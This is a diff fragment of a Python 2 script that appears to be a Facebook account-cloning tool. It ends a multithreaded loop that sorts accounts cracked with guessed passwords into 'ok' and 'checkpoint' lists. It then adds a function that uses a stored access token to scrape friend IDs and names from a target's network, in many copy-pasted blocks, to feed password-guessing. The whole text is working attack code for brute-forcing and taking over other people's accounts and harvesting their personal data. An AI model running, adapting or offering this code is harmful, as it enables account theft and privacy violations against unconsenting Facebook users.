@@ -1135,5 +1135,251 @@ fuck.close()
                                                     cp.close()
                                                     cps.append(uid+pass5)
                            
-                    
+        except:
+            pass
+    
+    p = ThreadPool(30)
+    p.map(main, idx)
+    print "\x1b[1;97m"
+    print 39*'-'
+    print "[!] cloning complete result ........"
+    print 39*'-'
+    print '[!] total ok ids : '+str(len(oks))
+    print '[!] total cp ids : '+str(len(cps))
+    print 39*'-'
+    print ''
+    raw_input(' Press enter to back ')
+    fb_menu()
+    
+def xokp():
+    hok=('jok.txt')
+    count=[]
+    rana=[]
+    try:
+        token=open('token.txt','r').read()
+    except:
+        fb_menu()
+    os.system('clear')
+    print logo
+    print ""
+    iiid=raw_input("[1] Enter ID : ")
+    print ""
+    ps1=raw_input('[1] Password : ')
+    ps2=raw_input('[2] Password : ')
+    ps3=raw_input('[3] Password : ')
+    ps4=raw_input('[4] Password : ')
+    print ""
+    rrp=requests.get ("https://graph.facebook.com/"+iiid+"?access_token="+token)
+    q=json.loads(rrp.text)
+    nid=q ['name']
+    r = requests.get('https://graph.facebook.com/' + iiid + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("look.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    print ""
+    print sm+"[=] Transfer From : "+nid+" > \x1b[1;91mFriends"
+    print ""
+    time.sleep(2)
+    print g+"[=] Transfer Complte Process Start *"+w
+    print ""
+    os.system(' cat look.txt | grep "100077" >> kk.txt')
+    os.system(' cat look.txt | grep "100078" >> kk.txt')
+    os.system('rm -rf look.txt')
+    file=open('kk.txt')
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')
+    fuck.close()
+    my_line = file.readline()
+    count.append(my_line)
+    print g+"[=] We are graping links for ok ids : "+my_line[:15]
+    r = requests.get('https://graph.facebook.com/' + my_line[:15] + '/friends?access_token=' + token)
+    z = json.loads(r.text)
+    fuck=open("jok.txt",'a')
+    for i in z['data']:
+        uid = i['id']
+        na = i['name']
+        rana.append(uid + '|' + na)
+        fuck.write(uid + '|' + na + '\n')                   
 		
